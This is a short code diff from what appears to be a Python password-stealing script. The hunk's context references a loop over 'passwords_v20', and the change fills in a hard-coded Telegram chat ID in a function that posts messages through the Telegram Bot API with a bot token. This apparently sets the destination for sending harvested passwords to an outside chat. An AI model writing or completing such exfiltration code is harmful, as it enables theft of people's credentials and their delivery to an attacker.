@@ -174,7 +174,7 @@ for p in passwords_v20:
 def send_telegram_message1(message):
     url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
     payload = {
-        'chat_id': ,
+        'chat_id': 6601089119,
         'text': message,
         'parse_mode': 'Markdown'
     }
